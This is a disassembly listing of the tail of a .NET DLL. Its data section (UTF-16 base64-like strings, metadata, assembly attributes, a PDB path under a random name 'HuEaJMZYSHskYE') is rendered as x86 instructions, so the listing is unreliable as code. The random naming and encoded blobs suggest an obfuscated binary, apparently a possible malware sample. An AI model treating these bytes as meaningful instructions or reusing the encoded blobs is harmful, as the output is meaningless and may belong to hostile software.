10004bc7:	00 7a 00             	add    %bh,0x0(%edx)
10004bca:	5a                   	pop    %edx
10004bcb:	00 45 00             	add    %al,0x0(%ebp)
10004bce:	52                   	push   %edx
10004bcf:	00 7a 00             	add    %bh,0x0(%edx)
10004bd2:	4e                   	dec    %esi
10004bd3:	00 32                	add    %dh,(%edx)
10004bd5:	00 61 00             	add    %ah,0x0(%ecx)
10004bd8:	44                   	inc    %esp
10004bd9:	00 4a 00             	add    %cl,0x0(%edx)
10004bdc:	47                   	inc    %edi
10004bdd:	00 5a 00             	add    %bl,0x0(%edx)
10004be0:	6c                   	insb   (%dx),%es:(%edi)
10004be1:	00 46 00             	add    %al,0x0(%esi)
10004be4:	31 00                	xor    %eax,(%eax)
10004be6:	54                   	push   %esp
10004be7:	00 57 00             	add    %dl,0x0(%edi)
10004bea:	4d                   	dec    %ebp
10004beb:	00 32                	add    %dh,(%edx)
10004bed:	00 52 00             	add    %dl,0x0(%edx)
10004bf0:	45                   	inc    %ebp
10004bf1:	00 63 00             	add    %ah,0x0(%ebx)
10004bf4:	7a 00                	jp     0x10004bf6
10004bf6:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004bfa:	67 00 79 00          	add    %bh,0x0(%bx,%di)
10004bfe:	52                   	push   %edx
10004bff:	00 6d 00             	add    %ch,0x0(%ebp)
10004c02:	5a                   	pop    %edx
10004c03:	00 6a 00             	add    %ch,0x0(%edx)
10004c06:	4e                   	dec    %esi
10004c07:	00 6b 00             	add    %ch,0x0(%ebx)
10004c0a:	52                   	push   %edx
10004c0b:	00 48 00             	add    %cl,0x0(%eax)
10004c0e:	4d                   	dec    %ebp
10004c0f:	00 33                	add    %dh,(%ebx)
10004c11:	00 5a 00             	add    %bl,0x0(%edx)
10004c14:	6f                   	outsl  %ds:(%esi),(%dx)
10004c15:	00 4d 00             	add    %cl,0x0(%ebp)
10004c18:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10004c1b:	00 6d 00             	add    %ch,0x0(%ebp)
10004c1e:	51                   	push   %ecx
10004c1f:	00 7a 00             	add    %bh,0x0(%edx)
10004c22:	52                   	push   %edx
10004c23:	00 36                	add    %dh,(%esi)
10004c25:	00 59 00             	add    %bl,0x0(%ecx)
10004c28:	7a 00                	jp     0x10004c2a
10004c2a:	5a                   	pop    %edx
10004c2b:	00 45 00             	add    %al,0x0(%ebp)
10004c2e:	52                   	push   %edx
10004c2f:	00 7a 00             	add    %bh,0x0(%edx)
10004c32:	4e                   	dec    %esi
10004c33:	00 32                	add    %dh,(%edx)
10004c35:	00 61 00             	add    %ah,0x0(%ecx)
10004c38:	44                   	inc    %esp
10004c39:	00 4a 00             	add    %cl,0x0(%edx)
10004c3c:	47                   	inc    %edi
10004c3d:	00 5a 00             	add    %bl,0x0(%edx)
10004c40:	6d                   	insl   (%dx),%es:(%edi)
10004c41:	00 4d 00             	add    %cl,0x0(%ebp)
10004c44:	32 00                	xor    (%eax),%al
10004c46:	52                   	push   %edx
10004c47:	00 45 00             	add    %al,0x0(%ebp)
10004c4a:	63 00                	arpl   %eax,(%eax)
10004c4c:	7a 00                	jp     0x10004c4e
10004c4e:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004c52:	67 00 79 00          	add    %bh,0x0(%bx,%di)
10004c56:	52                   	push   %edx
10004c57:	00 6d 00             	add    %ch,0x0(%ebp)
10004c5a:	5a                   	pop    %edx
10004c5b:	00 4e 00             	add    %cl,0x0(%esi)
10004c5e:	52                   	push   %edx
10004c5f:	00 45 00             	add    %al,0x0(%ebp)
10004c62:	31 00                	xor    %eax,(%eax)
10004c64:	6a 00                	push   $0x0
10004c66:	4e                   	dec    %esi
10004c67:	00 6b 00             	add    %ch,0x0(%ebx)
10004c6a:	52                   	push   %edx
10004c6b:	00 48 00             	add    %cl,0x0(%eax)
10004c6e:	4d                   	dec    %ebp
10004c6f:	00 33                	add    %dh,(%ebx)
10004c71:	00 5a 00             	add    %bl,0x0(%edx)
10004c74:	6f                   	outsl  %ds:(%esi),(%dx)
10004c75:	00 4d 00             	add    %cl,0x0(%ebp)
10004c78:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10004c7b:	00 6d 00             	add    %ch,0x0(%ebp)
10004c7e:	59                   	pop    %ecx
10004c7f:	00 7a 00             	add    %bh,0x0(%edx)
10004c82:	5a                   	pop    %edx
10004c83:	00 45 00             	add    %al,0x0(%ebp)
10004c86:	52                   	push   %edx
10004c87:	00 7a 00             	add    %bh,0x0(%edx)
10004c8a:	4e                   	dec    %esi
10004c8b:	00 32                	add    %dh,(%edx)
10004c8d:	00 61 00             	add    %ah,0x0(%ecx)
10004c90:	44                   	inc    %esp
10004c91:	00 4a 00             	add    %cl,0x0(%edx)
10004c94:	47                   	inc    %edi
10004c95:	00 5a 00             	add    %bl,0x0(%edx)
10004c98:	6e                   	outsb  %ds:(%esi),(%dx)
10004c99:	00 68 00             	add    %ch,0x0(%eax)
10004c9c:	50                   	push   %eax
10004c9d:	00 56 00             	add    %dl,0x0(%esi)
10004ca0:	6d                   	insl   (%dx),%es:(%edi)
10004ca1:	00 4d 00             	add    %cl,0x0(%ebp)
10004ca4:	32 00                	xor    (%eax),%al
10004ca6:	52                   	push   %edx
10004ca7:	00 45 00             	add    %al,0x0(%ebp)
10004caa:	63 00                	arpl   %eax,(%eax)
10004cac:	7a 00                	jp     0x10004cae
10004cae:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004cb2:	67 00 79 00          	add    %bh,0x0(%bx,%di)
10004cb6:	52                   	push   %edx
10004cb7:	00 6d 00             	add    %ch,0x0(%ebp)
10004cba:	5a                   	pop    %edx
10004cbb:	00 6a 00             	add    %ch,0x0(%edx)
10004cbe:	4e                   	dec    %esi
10004cbf:	00 6b 00             	add    %ch,0x0(%ebx)
10004cc2:	52                   	push   %edx
10004cc3:	00 48 00             	add    %cl,0x0(%eax)
10004cc6:	4d                   	dec    %ebp
10004cc7:	00 33                	add    %dh,(%ebx)
10004cc9:	00 5a 00             	add    %bl,0x0(%edx)
10004ccc:	6f                   	outsl  %ds:(%esi),(%dx)
10004ccd:	00 4d 00             	add    %cl,0x0(%ebp)
10004cd0:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10004cd3:	00 6d 00             	add    %ch,0x0(%ebp)
10004cd6:	65 00 47 00          	add    %al,%gs:0x0(%edi)
10004cda:	4e                   	dec    %esi
10004cdb:	00 6a 00             	add    %ch,0x0(%edx)
10004cde:	4e                   	dec    %esi
10004cdf:	00 6b 00             	add    %ch,0x0(%ebx)
10004ce2:	52                   	push   %edx
10004ce3:	00 48 00             	add    %cl,0x0(%eax)
10004ce6:	4d                   	dec    %ebp
10004ce7:	00 33                	add    %dh,(%ebx)
10004ce9:	00 5a 00             	add    %bl,0x0(%edx)
10004cec:	6f                   	outsl  %ds:(%esi),(%dx)
10004ced:	00 4d 00             	add    %cl,0x0(%ebp)
10004cf0:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10004cf3:	00 6d 00             	add    %ch,0x0(%ebp)
10004cf6:	00 15 63 00 36 00    	add    %dl,0x360063
10004cfc:	44                   	inc    %esp
10004cfd:	00 47 00             	add    %al,0x0(%edi)
10004d00:	33 00                	xor    (%eax),%eax
10004d02:	76 00                	jbe    0x10004d04
10004d04:	68 00 32 00 46       	push   $0x46003200
10004d09:	00 66 00             	add    %ah,0x0(%esi)
10004d0c:	00 80 b9 5a 00 32    	add    %al,0x32005ab9(%eax)
10004d12:	00 78 00             	add    %bh,0x0(%eax)
10004d15:	54                   	push   %esp
10004d16:	00 51 00             	add    %dl,0x0(%ecx)
10004d19:	6c                   	insb   (%dx),%es:(%edi)
10004d1a:	00 68 00             	add    %ch,0x0(%eax)
10004d1d:	50                   	push   %eax
10004d1e:	00 63 00             	add    %ah,0x0(%ebx)
10004d21:	45                   	inc    %ebp
10004d22:	00 46 00             	add    %al,0x0(%esi)
10004d25:	53                   	push   %ebx
10004d26:	00 56 00             	add    %dl,0x0(%esi)
10004d29:	55                   	push   %ebp
10004d2a:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
10004d2e:	00 4e 00             	add    %cl,0x0(%esi)
10004d31:	57                   	push   %edi
10004d32:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
10004d36:	00 55 00             	add    %dl,0x0(%ebp)
10004d39:	30 00                	xor    %al,(%eax)
10004d3b:	4a                   	dec    %edx
10004d3c:	00 59 00             	add    %bl,0x0(%ecx)
10004d3f:	54                   	push   %esp
10004d40:	00 33                	add    %dh,(%ebx)
10004d42:	00 42 00             	add    %al,0x0(%edx)
10004d45:	42                   	inc    %edx
10004d46:	00 55 00             	add    %dl,0x0(%ebp)
10004d49:	6c                   	insb   (%dx),%es:(%edi)
10004d4a:	00 56 00             	add    %dl,0x0(%esi)
10004d4d:	6e                   	outsb  %ds:(%esi),(%dx)
10004d4e:	00 62 00             	add    %ah,0x0(%edx)
10004d51:	46                   	inc    %esi
10004d52:	00 4e 00             	add    %cl,0x0(%esi)
10004d55:	43                   	inc    %ebx
10004d56:	00 57 00             	add    %dl,0x0(%edi)
10004d59:	45                   	inc    %ebp
10004d5a:	00 39                	add    %bh,(%ecx)
10004d5c:	00 77 00             	add    %dh,0x0(%edi)
10004d5f:	51                   	push   %ecx
10004d60:	00 56 00             	add    %dl,0x0(%esi)
10004d63:	4a                   	dec    %edx
10004d64:	00 56 00             	add    %dl,0x0(%esi)
10004d67:	62 00                	bound  %eax,(%eax)
10004d69:	47                   	inc    %edi
10004d6a:	00 56 00             	add    %dl,0x0(%esi)
10004d6d:	48                   	dec    %eax
10004d6e:	00 5a 00             	add    %bl,0x0(%edx)
10004d71:	32 00                	xor    (%eax),%al
10004d73:	78 00                	js     0x10004d75
10004d75:	54                   	push   %esp
10004d76:	00 51 00             	add    %dl,0x0(%ecx)
10004d79:	6c                   	insb   (%dx),%es:(%edi)
10004d7a:	00 68 00             	add    %ch,0x0(%eax)
10004d7d:	50                   	push   %eax
10004d7e:	00 63 00             	add    %ah,0x0(%ebx)
10004d81:	45                   	inc    %ebp
10004d82:	00 46 00             	add    %al,0x0(%esi)
10004d85:	53                   	push   %ebx
10004d86:	00 56 00             	add    %dl,0x0(%esi)
10004d89:	57                   	push   %edi
10004d8a:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
10004d8e:	00 55 00             	add    %dl,0x0(%ebp)
10004d91:	30 00                	xor    %al,(%eax)
10004d93:	4a                   	dec    %edx
10004d94:	00 59 00             	add    %bl,0x0(%ecx)
10004d97:	54                   	push   %esp
10004d98:	00 33                	add    %dh,(%ebx)
10004d9a:	00 42 00             	add    %al,0x0(%edx)
10004d9d:	42                   	inc    %edx
10004d9e:	00 55 00             	add    %dl,0x0(%ebp)
10004da1:	6c                   	insb   (%dx),%es:(%edi)
10004da2:	00 56 00             	add    %dl,0x0(%esi)
10004da5:	56                   	push   %esi
10004da6:	00 50 00             	add    %dl,0x0(%eax)
10004da9:	57                   	push   %edi
10004daa:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
10004dae:	00 55 00             	add    %dl,0x0(%ebp)
10004db1:	30 00                	xor    %al,(%eax)
10004db3:	4a                   	dec    %edx
10004db4:	00 59 00             	add    %bl,0x0(%ecx)
10004db7:	54                   	push   %esp
10004db8:	00 33                	add    %dh,(%ebx)
10004dba:	00 42 00             	add    %al,0x0(%edx)
10004dbd:	42                   	inc    %edx
10004dbe:	00 55 00             	add    %dl,0x0(%ebp)
10004dc1:	6c                   	insb   (%dx),%es:(%edi)
10004dc2:	00 55 00             	add    %dl,0x0(%ebp)
10004dc5:	3d 00 00 15 67       	cmp    $0x67150000,%eax
10004dca:	00 6c 00 53          	add    %ch,0x53(%eax,%eax,1)
10004dce:	00 42 00             	add    %al,0x0(%edx)
10004dd1:	58                   	pop    %eax
10004dd2:	00 4f 00             	add    %cl,0x0(%edi)
10004dd5:	70 00                	jo     0x10004dd7
10004dd7:	41                   	inc    %ecx
10004dd8:	00 52 00             	add    %dl,0x0(%edx)
10004ddb:	55                   	push   %ebp
10004ddc:	00 00                	add    %al,(%eax)
10004dde:	00 00                	add    %al,(%eax)
10004de0:	f5                   	cmc
10004de1:	16                   	push   %ss
10004de2:	99                   	cltd
10004de3:	03 4f f0             	add    -0x10(%edi),%ecx
10004de6:	ec                   	in     (%dx),%al
10004de7:	47                   	inc    %edi
10004de8:	b3 a2                	mov    $0xa2,%bl
10004dea:	ac                   	lods   %ds:(%esi),%al
10004deb:	47                   	inc    %edi
10004dec:	82 cc d8             	or     $0xd8,%ah
10004def:	69 00 04 20 01 01    	imul   $0x1012004,(%eax),%eax
10004df5:	08 03                	or     %al,(%ebx)
10004df7:	20 00                	and    %al,(%eax)
10004df9:	01 05 20 01 01 11    	add    %eax,0x11010120
10004dff:	11 04 20             	adc    %eax,(%eax,%eiz,1)
10004e02:	01 01                	add    %eax,(%ecx)
10004e04:	0e                   	push   %cs
10004e05:	04 20                	add    $0x20,%al
10004e07:	01 01                	add    %eax,(%ecx)
10004e09:	02 0c 07             	add    (%edi,%eax,1),%cl
10004e0c:	07                   	pop    %es
10004e0d:	11 10                	adc    %edx,(%eax)
10004e0f:	11 0c 18             	adc    %ecx,(%eax,%ebx,1)
10004e12:	18 18                	sbb    %bl,(%eax)
10004e14:	12 45 09             	adc    0x9(%ebp),%al
10004e17:	06                   	push   %es
10004e18:	10 01                	adc    %al,(%ecx)
10004e1a:	01 08                	add    %ecx,(%eax)
10004e1c:	1e                   	push   %ds
10004e1d:	00 04 0a             	add    %al,(%edx,%ecx,1)
10004e20:	01 11                	add    %edx,(%ecx)
10004e22:	10 02                	adc    %al,(%edx)
10004e24:	06                   	push   %es
10004e25:	18 05 00 02 02 18    	sbb    %al,0x18020200
10004e2b:	18 04 00             	sbb    %al,(%eax,%eax,1)
10004e2e:	00 12                	add    %dl,(%edx)
10004e30:	61                   	popa
10004e31:	05 00 01 1d 05       	add    $0x51d0100,%eax
10004e36:	0e                   	push   %cs
10004e37:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
10004e3c:	05 05 20 02 0e       	add    $0xe022005,%eax
10004e41:	0e                   	push   %cs
10004e42:	0e                   	push   %cs
10004e43:	04 00                	add    $0x0,%al
10004e45:	01 01                	add    %eax,(%ecx)
10004e47:	08 05 00 01 12 45    	or     %al,0x45120100
10004e4d:	08 03                	or     %al,(%ebx)
10004e4f:	20 00                	and    %al,(%eax)
10004e51:	02 06                	add    (%esi),%al
10004e53:	07                   	pop    %es
10004e54:	02 12                	add    (%edx),%dl
10004e56:	14 1d                	adc    $0x1d,%al
10004e58:	0e                   	push   %cs
10004e59:	05 15 12 55 01       	add    $0x1551215,%eax
10004e5e:	0e                   	push   %cs
10004e5f:	05 20 01 01 13       	add    $0x13010120,%eax
10004e64:	00 08                	add    %cl,(%eax)
10004e66:	00 03                	add    %al,(%ebx)
10004e68:	1d 0e 0e 0e 11       	sbb    $0x110e0e0e,%eax
10004e6d:	75 06                	jne    0x10004e75
10004e6f:	15 12 79 02 0e       	adc    $0xe027912,%eax
10004e74:	02 05 20 02 01 1c    	add    0x1c010220,%al
10004e7a:	18 18                	sbb    %bl,(%eax)
10004e7c:	10 01                	adc    %al,(%ecx)
10004e7e:	02 15 12 80 81 01    	add    0x1818012,%dl
10004e84:	1e                   	push   %ds
10004e85:	00 15 12 80 81 01    	add    %dl,0x1818012
10004e8b:	1e                   	push   %ds
10004e8c:	00 15 12 79 02 1e    	add    %dl,0x1e027912
10004e92:	00 02                	add    %al,(%edx)
10004e94:	03 0a                	add    (%edx),%ecx
10004e96:	01 0e                	add    %ecx,(%esi)
10004e98:	0d 10 01 01 1d       	or     $0x1d010110,%eax
10004e9d:	1e                   	push   %ds
10004e9e:	00 15 12 80 81 01    	add    %dl,0x1818012
10004ea4:	1e                   	push   %ds
10004ea5:	00 04 20             	add    %al,(%eax,%eiz,1)
10004ea8:	01 08                	add    %ecx,(%eax)
10004eaa:	08 04 00             	or     %al,(%eax,%eax,1)
10004ead:	01 0e                	add    %ecx,(%esi)
10004eaf:	0e                   	push   %cs
10004eb0:	05 20 01 02 13       	add    $0x13020120,%eax
10004eb5:	00 08                	add    %cl,(%eax)
10004eb7:	b7 7a                	mov    $0x7a,%bh
10004eb9:	5c                   	pop    %esp
10004eba:	56                   	push   %esi
10004ebb:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
10004ebe:	89 02                	mov    %eax,(%edx)
10004ec0:	06                   	push   %es
10004ec1:	09 02                	or     %eax,(%edx)
10004ec3:	06                   	push   %es
10004ec4:	0e                   	push   %cs
10004ec5:	02 06                	add    (%esi),%al
10004ec7:	08 02                	or     %al,(%edx)
10004ec9:	06                   	push   %es
10004eca:	06                   	push   %es
10004ecb:	06                   	push   %es
10004ecc:	06                   	push   %es
10004ecd:	15 12 55 01 0e       	adc    $0xe015512,%eax
10004ed2:	06                   	push   %es
10004ed3:	00 02                	add    %al,(%edx)
10004ed5:	02 18                	add    (%eax),%bl
10004ed7:	10 09                	adc    %cl,(%ecx)
10004ed9:	04 00                	add    $0x0,%al
10004edb:	01 02                	add    %eax,(%edx)
10004edd:	18 08                	sbb    %cl,(%eax)
10004edf:	00 05 18 18 18 09    	add    %al,0x9181818
10004ee5:	09 09                	or     %ecx,(%ecx)
10004ee7:	06                   	push   %es
10004ee8:	00 02                	add    %al,(%edx)
10004eea:	01 0e                	add    %ecx,(%esi)
10004eec:	1d 05 11 00 0a       	sbb    $0xa001105,%eax
10004ef1:	02 0e                	add    (%esi),%cl
10004ef3:	0e                   	push   %cs
10004ef4:	18 18                	sbb    %bl,(%eax)
10004ef6:	02 09                	add    (%ecx),%cl
10004ef8:	18 0e                	sbb    %cl,(%esi)
10004efa:	10 11                	adc    %dl,(%ecx)
10004efc:	10 10                	adc    %dl,(%eax)
10004efe:	11 0c 0b             	adc    %ecx,(%ebx,%ecx,1)
10004f01:	00 07                	add    %al,(%edi)
10004f03:	18 18                	sbb    %bl,(%eax)
10004f05:	18 09                	sbb    %cl,(%ecx)
10004f07:	18 18                	sbb    %bl,(%eax)
10004f09:	09 10                	or     %edx,(%eax)
10004f0b:	18 0a                	sbb    %cl,(%edx)
10004f0d:	00 05 02 18 18 1d    	add    %al,0x1d181802
10004f13:	05 09 10 18 03       	add    $0x3181009,%eax
10004f18:	00 00                	add    %al,(%eax)
10004f1a:	0e                   	push   %cs
10004f1b:	04 20                	add    $0x20,%al
10004f1d:	01 02                	add    %eax,(%edx)
10004f1f:	0e                   	push   %cs
10004f20:	08 01                	or     %al,(%ecx)
10004f22:	00 08                	add    %cl,(%eax)
10004f24:	00 00                	add    %al,(%eax)
10004f26:	00 00                	add    %al,(%eax)
10004f28:	00 1e                	add    %bl,(%esi)
10004f2a:	01 00                	add    %eax,(%eax)
10004f2c:	01 00                	add    %eax,(%eax)
10004f2e:	54                   	push   %esp
10004f2f:	02 16                	add    (%esi),%dl
10004f31:	57                   	push   %edi
10004f32:	72 61                	jb     0x10004f95
10004f34:	70 4e                	jo     0x10004f84
10004f36:	6f                   	outsl  %ds:(%esi),(%dx)
10004f37:	6e                   	outsb  %ds:(%esi),(%dx)
10004f38:	45                   	inc    %ebp
10004f39:	78 63                	js     0x10004f9e
10004f3b:	65 70 74             	gs jo  0x10004fb2
10004f3e:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
10004f45:	77 73                	ja     0x10004fba
10004f47:	01 08                	add    %ecx,(%eax)
10004f49:	01 00                	add    %eax,(%eax)
10004f4b:	02 00                	add    (%eax),%al
10004f4d:	00 00                	add    %al,(%eax)
10004f4f:	00 00                	add    %al,(%eax)
10004f51:	13 01                	adc    (%ecx),%eax
10004f53:	00 0e                	add    %cl,(%esi)
10004f55:	48                   	dec    %eax
10004f56:	75 45                	jne    0x10004f9d
10004f58:	61                   	popa
10004f59:	4a                   	dec    %edx
10004f5a:	4d                   	dec    %ebp
10004f5b:	5a                   	pop    %edx
10004f5c:	59                   	pop    %ecx
10004f5d:	53                   	push   %ebx
10004f5e:	48                   	dec    %eax
10004f5f:	73 6b                	jae    0x10004fcc
10004f61:	59                   	pop    %ecx
10004f62:	45                   	inc    %ebp
10004f63:	00 00                	add    %al,(%eax)
10004f65:	05 01 00 00 00       	add    $0x1,%eax
10004f6a:	00 17                	add    %dl,(%edi)
10004f6c:	01 00                	add    %eax,(%eax)
10004f6e:	12 43 6f             	adc    0x6f(%ebx),%al
10004f71:	70 79                	jo     0x10004fec
10004f73:	72 69                	jb     0x10004fde
10004f75:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
10004f7b:	20 20                	and    %ah,(%eax)
10004f7d:	32 30                	xor    (%eax),%dh
10004f7f:	32 34 00             	xor    (%eax,%eax,1),%dh
10004f82:	00 29                	add    %ch,(%ecx)
10004f84:	01 00                	add    %eax,(%eax)
10004f86:	24 32                	and    $0x32,%al
10004f88:	33 44 42 39          	xor    0x39(%edx,%eax,2),%eax
10004f8c:	42                   	inc    %edx
10004f8d:	44                   	inc    %esp
10004f8e:	30 2d 30 44 39 30    	xor    %ch,0x30394430
10004f94:	2d 34 44 31 44       	sub    $0x44314434,%eax
10004f99:	2d 41 33 32 46       	sub    $0x46323341,%eax
10004f9e:	2d 39 43 45 39       	sub    $0x39454339,%eax
10004fa3:	44                   	inc    %esp
10004fa4:	45                   	inc    %ebp
10004fa5:	46                   	inc    %esi
10004fa6:	45                   	inc    %ebp
10004fa7:	46                   	inc    %esi
10004fa8:	34 37                	xor    $0x37,%al
10004faa:	34 00                	xor    $0x0,%al
10004fac:	00 0c 01             	add    %cl,(%ecx,%eax,1)
10004faf:	00 07                	add    %al,(%edi)
10004fb1:	31 2e                	xor    %ebp,(%esi)
10004fb3:	30 2e                	xor    %ch,(%esi)
10004fb5:	30 2e                	xor    %ch,(%esi)
10004fb7:	30 00                	xor    %al,(%eax)
10004fb9:	00 49 01             	add    %cl,0x1(%ecx)
10004fbc:	00 1a                	add    %bl,(%edx)
10004fbe:	2e 4e                	cs dec %esi
10004fc0:	45                   	inc    %ebp
10004fc1:	54                   	push   %esp
10004fc2:	46                   	inc    %esi
10004fc3:	72 61                	jb     0x10005026
10004fc5:	6d                   	insl   (%dx),%es:(%edi)
10004fc6:	65 77 6f             	gs ja  0x10005038
10004fc9:	72 6b                	jb     0x10005036
10004fcb:	2c 56                	sub    $0x56,%al
10004fcd:	65 72 73             	gs jb  0x10005043
10004fd0:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
10004fd7:	38 01                	cmp    %al,(%ecx)
10004fd9:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
10004fdd:	46                   	inc    %esi
10004fde:	72 61                	jb     0x10005041
10004fe0:	6d                   	insl   (%dx),%es:(%edi)
10004fe1:	65 77 6f             	gs ja  0x10005053
10004fe4:	72 6b                	jb     0x10005051
10004fe6:	44                   	inc    %esp
10004fe7:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
10004fee:	61                   	popa
10004fef:	6d                   	insl   (%dx),%es:(%edi)
10004ff0:	65 12 2e             	adc    %gs:(%esi),%ch
10004ff3:	4e                   	dec    %esi
10004ff4:	45                   	inc    %ebp
10004ff5:	54                   	push   %esp
10004ff6:	20 46 72             	and    %al,0x72(%esi)
10004ff9:	61                   	popa
10004ffa:	6d                   	insl   (%dx),%es:(%edi)
10004ffb:	65 77 6f             	gs ja  0x1000506d
10004ffe:	72 6b                	jb     0x1000506b
10005000:	20 34 2e             	and    %dh,(%esi,%ebp,1)
10005003:	38 04 01             	cmp    %al,(%ecx,%eax,1)
	...
1000500e:	00 00                	add    %al,(%eax)
10005010:	27                   	daa
10005011:	6c                   	insb   (%dx),%es:(%edi)
10005012:	39 ab 00 00 00 00    	cmp    %ebp,0x0(%ebx)
10005018:	02 00                	add    (%eax),%al
1000501a:	00 00                	add    %al,(%eax)
1000501c:	5b                   	pop    %ebx
1000501d:	00 00                	add    %al,(%eax)
1000501f:	00 44 50 00          	add    %al,0x0(%eax,%edx,2)
10005023:	00 44 32 00          	add    %al,0x0(%edx,%esi,1)
	...
10005033:	00 10                	add    %dl,(%eax)
	...
10005041:	00 00                	add    %al,(%eax)
10005043:	00 52 53             	add    %dl,0x53(%edx)
10005046:	44                   	inc    %esp
10005047:	53                   	push   %ebx
10005048:	29 51 72             	sub    %edx,0x72(%ecx)
1000504b:	82 02 1c             	addb   $0x1c,(%edx)
1000504e:	e3 49                	jecxz  0x10005099
10005050:	8d 6c 21 49          	lea    0x49(%ecx,%eiz,1),%ebp
10005054:	7b b6                	jnp    0x1000500c
10005056:	73 3d                	jae    0x10005095
10005058:	01 00                	add    %eax,(%eax)
1000505a:	00 00                	add    %al,(%eax)
1000505c:	43                   	inc    %ebx
1000505d:	3a 5c 61 70          	cmp    0x70(%ecx,%eiz,2),%bl
10005061:	70 5c                	jo     0x100050bf
10005063:	61                   	popa
10005064:	73 73                	jae    0x100050d9
10005066:	65 74 73             	gs je  0x100050dc
10005069:	5c                   	pop    %esp
1000506a:	62 69 6e             	bound  %ebp,0x6e(%ecx)
1000506d:	5c                   	pop    %esp
1000506e:	74 65                	je     0x100050d5
10005070:	6d                   	insl   (%dx),%es:(%edi)
10005071:	70 2d                	jo     0x100050a0
10005073:	38 38                	cmp    %bh,(%eax)
10005075:	65 62 64 62 31       	bound  %esp,%gs:0x31(%edx,%eiz,2)
1000507a:	65 31 63 31          	xor    %esp,%gs:0x31(%ebx)
1000507e:	37                   	aaa
1000507f:	5c                   	pop    %esp
10005080:	6f                   	outsl  %ds:(%esi),(%dx)
10005081:	62 6a 5c             	bound  %ebp,0x5c(%edx)
10005084:	52                   	push   %edx
10005085:	65 6c                	gs insb (%dx),%es:(%edi)
10005087:	65 61                	gs popa
10005089:	73 65                	jae    0x100050f0
1000508b:	5c                   	pop    %esp
1000508c:	48                   	dec    %eax
1000508d:	75 45                	jne    0x100050d4
1000508f:	61                   	popa
10005090:	4a                   	dec    %edx
10005091:	4d                   	dec    %ebp
10005092:	5a                   	pop    %edx
10005093:	59                   	pop    %ecx
10005094:	53                   	push   %ebx
10005095:	48                   	dec    %eax
10005096:	73 6b                	jae    0x10005103
10005098:	59                   	pop    %ecx
10005099:	45                   	inc    %ebp
1000509a:	2e 70 64             	jo,pn  0x10005101
1000509d:	62 00                	bound  %eax,(%eax)
1000509f:	c7                   	(bad)
100050a0:	50                   	push   %eax
	...
100050a9:	00 00                	add    %al,(%eax)
100050ab:	e1 50                	loope  0x100050fd
100050ad:	00 00                	add    %al,(%eax)
100050af:	00 20                	add    %ah,(%eax)
	...
100050c5:	00 00                	add    %al,(%eax)
100050c7:	d3 50 00             	rcll   %cl,0x0(%eax)
	...
100050d2:	00 00                	add    %al,(%eax)
100050d4:	00 5f 43             	add    %bl,0x43(%edi)
100050d7:	6f                   	outsl  %ds:(%esi),(%dx)
100050d8:	72 44                	jb     0x1000511e
100050da:	6c                   	insb   (%dx),%es:(%edi)
100050db:	6c                   	insb   (%dx),%es:(%edi)
100050dc:	4d                   	dec    %ebp
100050dd:	61                   	popa
100050de:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
100050e5:	72 65                	jb     0x1000514c
100050e7:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
100050eb:	6c                   	insb   (%dx),%es:(%edi)
100050ec:	00 00                	add    %al,(%eax)
100050ee:	00 00                	add    %al,(%eax)
100050f0:	00 00                	add    %al,(%eax)
100050f2:	ff 25 00 20 00 10    	jmp    *0x10002000
